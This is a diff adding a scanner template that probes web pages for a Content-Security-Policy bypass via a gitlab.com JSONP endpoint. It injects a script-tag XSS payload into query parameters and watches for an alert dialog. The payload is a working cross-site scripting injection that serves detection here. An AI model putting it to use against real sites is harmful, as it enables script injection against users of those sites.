@@ -1,0 +1,55 @@
+id: gitlab-page-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - GitLab Page
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,gitlab-page,vuln
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "gitlab.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: gitlab_page_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://page.gitlab.com/index.php/form/getForm?munchkinId=194-VVC-221&form=1077&callback=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "gitlab_page_csp_xss == true"
+# digest: 490a0046304402200acc53b34f1d448f4b8b51bebbbb41d5b80088741bd9d5d0ec173e1e2671bf65022000f0847a68840900a65fdf3eee2f05290fb724ee7bcfdcd8580af4c8706ec420:922c64590222798bb761d5b6d8e72950
